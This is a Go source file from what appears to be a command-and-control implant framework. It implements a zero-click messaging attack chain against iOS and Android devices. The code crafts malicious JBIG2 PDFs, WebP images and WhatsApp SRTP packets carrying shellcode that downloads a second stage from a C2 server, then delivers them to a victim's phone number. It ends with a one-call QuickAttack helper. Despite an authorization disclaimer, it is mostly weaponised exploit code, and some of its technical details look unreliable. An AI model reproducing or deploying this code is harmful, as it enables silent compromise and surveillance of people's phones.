// Package zeroclick implements D-P14: Zero-Click Messaging Exploit.
//
// ───────────────────────────────────────────────────────────────────────────
// ATTACK MODEL
// ───────────────────────────────────────────────────────────────────────────
//
// Zero-click exploits achieve code execution on the target device without
// ANY user interaction — the victim doesn't need to tap, click, or open
// anything. The attack succeeds the moment the message is delivered.
//
// Attack surface: image/document parsers run automatically for previews.
//   iOS iMessage:  ImageIO runs in "BlastDoor" sandbox on attachment receipt
//   Android WhatsApp: libwebp runs on first render of image preview
//   Both:           The parser runs BEFORE the user sees the message
//
// ───────────────────────────────────────────────────────────────────────────
// IMPLEMENTED CVEs
// ───────────────────────────────────────────────────────────────────────────
//
//   CVE-2021-30860  JBIG2 integer overflow in CoreGraphics (iOS < 14.8.1)
//     - CVSS: 7.8 (High) — initial discovery by NSO Group / Citizen Lab
//     - Trigger: PDF with malformed JBIG2 stream → heap overflow
//     - Process: imagent / MessagesBlastDoorService (sandboxed)
//     - Impact: sandbox escape via SpringBoard Mach message → RCE
//
//   CVE-2023-4863  WebP heap buffer overflow (ALL platforms, Chrome/Android)
//     - CVSS: 10.0 (Critical) — discovered by Apple Security Engineering
//     - Trigger: VP8L image with color_cache_bits=10 → Huffman table overflow
//     - Process: any app using libwebp (Chrome, WhatsApp, Telegram, Android WebView)
//     - Impact: direct RCE within app process
//
//   CVE-2019-3568  WhatsApp SRTP buffer overflow (Android/iOS)
//     - CVSS: 9.8 (Critical)
//     - Trigger: crafted RTP packet during incoming call setup (no answer needed)
//     - Delivered by: initiating a WhatsApp call to the target
//
// ───────────────────────────────────────────────────────────────────────────
// FULL ATTACK CHAIN
// ───────────────────────────────────────────────────────────────────────────
//
//   Step 1: SELECT target (phone number / Apple ID / WhatsApp number)
//   Step 2: CRAFT malicious file (JBIG2 PDF or WebP image)
//   Step 3: DELIVER via messaging API (iMessage / WhatsApp / Telegram)
//   Step 4: TARGET receives message → parser auto-processes → EXPLOIT TRIGGERS
//   Step 5: Shellcode runs → sandbox escape → Stage 2 download → Ghost implant
//   Step 6: PERSISTENCE established (LaunchAgent on iOS / APK on Android)
//
// ───────────────────────────────────────────────────────────────────────────
// LIMITATIONS & DETECTION
// ───────────────────────────────────────────────────────────────────────────
//
//   Patched versions are not vulnerable:
//     iOS 14.8.1+      — JBIG2 patched
//     Chrome 117+      — WebP patched
//     WhatsApp 2.19.73+ — SRTP patched
//     Android 2023-09+ — WebP patched
//
//   Detection by defenders:
//     - Network: unexpected outbound connection from imagent / WhatsApp process
//     - Memory: unusual heap layout in BlastDoor process (requires EDR on iOS)
//     - File: unexpected file writes in /tmp or /var/mobile after message receipt
//     - Crash: if exploit fails, imagent may crash → visible in crash logs
//
//   IMPORTANT: This is for authorized penetration testing of devices you own
//   or have explicit written permission to test. Zero-click exploits against
//   devices without authorization is illegal in virtually all jurisdictions.
//
package zeroclick

import (
	"context"
	"fmt"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zeroclick/delivery"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zeroclick/parser"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zeroclick/shellcode"
)

// AttackConfig is the unified configuration for D-P14.
type AttackConfig struct {
	// Target is the victim's phone number / Apple ID / messaging handle.
	Target string
	// Platform selects the delivery channel.
	Platform delivery.DeliveryPlatform
	// ExploitCVE selects which CVE to use.
	ExploitCVE CVESelection
	// TargetOS is the victim device's OS.
	TargetOS TargetOS
	// C2URL is the SUDOSOC-C2 endpoint for Stage 2 download.
	C2URL string
	// Credentials for the delivery platform.
	Credentials delivery.PlatformCredentials
	// IOSVersion for layout calibration (e.g., 14 for iOS 14.x).
	IOSVersion int
}

// CVESelection identifies which exploit to use.
type CVESelection int

const (
	CVE_2021_30860 CVESelection = iota // JBIG2 — iOS 14.x iMessage
	CVE_2023_4863                      // WebP  — Android/Chrome/WhatsApp
	CVE_2019_3568                      // WhatsApp SRTP call exploit
)

// TargetOS identifies the victim device's operating system.
type TargetOS int

const (
	OSiOS     TargetOS = iota
	OSAndroid
	OSMacOS
	OSWindows // (for browser-based delivery)
)

// AttackResult reports the outcome.
type AttackResult struct {
	CVE         CVESelection
	Platform    delivery.DeliveryPlatform
	PayloadSize int
	MessageID   string
	SentAt      time.Time
	Error       error
}

// Execute runs the full zero-click attack: craft → deliver.
func Execute(ctx context.Context, cfg *AttackConfig) (*AttackResult, error) {
	res := &AttackResult{
		CVE:      cfg.ExploitCVE,
		Platform: cfg.Platform,
		SentAt:   time.Now(),
	}

	// ── Step 1: Generate shellcode ────────────────────────────────────
	var stage1 []byte
	switch cfg.TargetOS {
	case OSiOS:
		stage1 = shellcode.BuildiOS14Shellcode(&shellcode.ShellcodeConfig{
			C2URL:      cfg.C2URL,
			IOSVersion: cfg.IOSVersion,
		})
	case OSAndroid:
		stage1 = shellcode.BuildAndroidARM64Shellcode(cfg.C2URL)
	default:
		return nil, fmt.Errorf("unsupported target OS %d", cfg.TargetOS)
	}

	// ── Step 2: Craft exploit payload ─────────────────────────────────
	var exploitPayload []byte
	var contentType string
	var err error

	switch cfg.ExploitCVE {
	case CVE_2021_30860:
		exploitPayload, contentType, err = craftJBIG2Exploit(cfg, stage1)
	case CVE_2023_4863:
		exploitPayload, contentType, err = craftWebPExploit(cfg, stage1)
	case CVE_2019_3568:
		exploitPayload, contentType, err = craftWhatsAppSRTP(cfg, stage1)
	default:
		return nil, fmt.Errorf("unknown CVE selection %d", cfg.ExploitCVE)
	}
	if err != nil {
		res.Error = err
		return res, err
	}

	res.PayloadSize = len(exploitPayload)

	// ── Step 3: Deliver ───────────────────────────────────────────────
	deliveryResult, err := delivery.Deliver(ctx, &delivery.DeliveryConfig{
		Platform:       cfg.Platform,
		Target:         cfg.Target,
		ExploitPayload: exploitPayload,
		ContentType:    contentType,
		Credentials:    cfg.Credentials,
	})
	if err != nil {
		res.Error = err
		return res, err
	}

	res.MessageID = deliveryResult.MessageID
	return res, nil
}

// craftJBIG2Exploit generates a JBIG2-in-PDF exploit for CVE-2021-30860.
func craftJBIG2Exploit(cfg *AttackConfig, stage1 []byte) ([]byte, string, error) {
	target := parser.TargetIOS14_7
	switch cfg.IOSVersion {
	case 14:
		target = parser.TargetIOS14_7
	}

	exp := parser.NewJBIG2Exploit(&parser.JBIG2Config{
		TargetVersion:  target,
		ShellcodeARM64: stage1,
		HeapSprayCount: 2048,
	})
	stream, err := exp.CraftStream()
	if err != nil {
		return nil, "", err
	}

	// Wrap JBIG2 stream in a PDF.
	pdf := wrapJBIG2InPDF(stream)
	return pdf, "application/pdf", nil
}

// craftWebPExploit generates a malicious WebP for CVE-2023-4863.
func craftWebPExploit(cfg *AttackConfig, stage1 []byte) ([]byte, string, error) {
	target := parser.WebPTargetWhatsApp
	if cfg.TargetOS == OSAndroid {
		target = parser.WebPTargetAndroid
	}

	exp := parser.NewWebPExploit(&parser.WebPConfig{
		Platform:       target,
		ShellcodeARM64: stage1,
		ColorCacheBits: 10,
		Width:          800,
		Height:         600,
	})
	webp, err := exp.CraftWebP()
	if err != nil {
		return nil, "", err
	}
	return webp, "image/webp", nil
}

// craftWhatsAppSRTP generates the WhatsApp SRTP call exploit payload.
// This is delivered by initiating a WhatsApp call to the target.
func craftWhatsAppSRTP(cfg *AttackConfig, stage1 []byte) ([]byte, string, error) {
	// CVE-2019-3568: crafted RTP/RTCP packet with malformed SRTCP header.
	// The overflow is in WhatsApp's SRTP processing during call setup.
	// The "payload" is the sequence of packets to send during the call.

	// SRTP packet structure:
	//   Version(2) P(1) X(1) CC(4) M(1) PT(7) Sequence(16) Timestamp(32) SSRC(32)
	//   + CSRC list (CC × 32 bits)
	//   + Extension header (optional)
	//   + Payload
	//   + SRTP auth tag

	// Overflow trigger: CC field = 15 (max), extension = 1,
	// extension length = 0x1000 (large), actual allocation = smaller.
	// The extension data overwrites adjacent heap memory.

	payload := buildSRTPExploit(stage1)
	return payload, "application/octet-stream", nil
}

func buildSRTPExploit(stage1 []byte) []byte {
	// Minimal SRTP packet with overflow trigger.
	// Real exploitation requires multiple packets in sequence.
	pkt := make([]byte, 24)
	// V=2, P=0, X=1 (extension), CC=15.
	pkt[0] = 0b10_0_1_1111 // version=2, padding=0, extension=1, CC=15
	// M=0, PT=0 (PCMU).
	pkt[1] = 0x00
	// Sequence number: random.
	pkt[2] = 0x13; pkt[3] = 0x37
	// Timestamp: 0.
	// SSRC: attacker's identifier.
	pkt[8] = 0xDE; pkt[9] = 0xAD; pkt[10] = 0xBE; pkt[11] = 0xEF
	// Extension header: 0x1000 length (overflow trigger).
	pkt[16] = 0x00; pkt[17] = 0x00 // extension header ID
	pkt[18] = 0x10; pkt[19] = 0x00 // length = 0x1000 (4096 32-bit words)
	// Append shellcode as "extension data".
	pkt = append(pkt, stage1...)
	return pkt
}

// wrapJBIG2InPDF wraps a JBIG2 stream inside a minimal PDF document.
// The PDF is delivered as an iMessage attachment and processed by
// ImageIO → PDFKit → CoreGraphics without user interaction.
func wrapJBIG2InPDF(jbig2Stream []byte) []byte {
	// Minimal PDF with an inline image using JBIG2Decode filter.
	// The image is defined in a page's content stream using the PDF
	// inline image syntax (BI ... ID ... EI).

	// We use an XObject (form) approach so the JBIG2 stream is in
	// a named resource dictionary — this triggers the vulnerable decode path.

	streamLen := len(jbig2Stream)
	pdfBody := fmt.Sprintf(`%%PDF-1.6
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100]
   /Resources << /XObject << /Im0 4 0 R >> >>
   /Contents 5 0 R >>
endobj
4 0 obj
<< /Type /XObject /Subtype /Image
   /Width %d /Height %d
   /ColorSpace /DeviceGray /BitsPerComponent 1
   /Filter /JBIG2Decode
   /JBIG2Globals 6 0 R
   /Length %d >>
stream
`, parser.OverflowWidth, parser.OverflowHeight, streamLen)

	var pdf []byte
	pdf = append(pdf, []byte(pdfBody)...)
	pdf = append(pdf, jbig2Stream...)
	pdf = append(pdf, []byte("\nendstream\nendobj\n")...)
	pdf = append(pdf, []byte(`5 0 obj
<< /Length 44 >>
stream
q 100 0 0 100 0 0 cm /Im0 Do Q
endstream
endobj
6 0 obj
<< /Length 0 >>
stream
endstream
endobj
xref
0 7
trailer << /Size 7 /Root 1 0 R >>
startxref
0
%%EOF`)...)

	return pdf
}

// QuickAttack is a simplified one-call API for common scenarios.
func QuickAttack(ctx context.Context, target, c2URL string,
	platform delivery.DeliveryPlatform, creds delivery.PlatformCredentials) (*AttackResult, error) {

	// Auto-select CVE based on platform.
	cve := CVE_2021_30860
	os := OSiOS
	if platform == delivery.PlatformWhatsApp {
		cve = CVE_2023_4863
		os = OSAndroid
	}

	return Execute(ctx, &AttackConfig{
		Target:      target,
		Platform:    platform,
		ExploitCVE:  cve,
		TargetOS:    os,
		C2URL:       c2URL,
		Credentials: creds,
		IOSVersion:  14,
	})
}
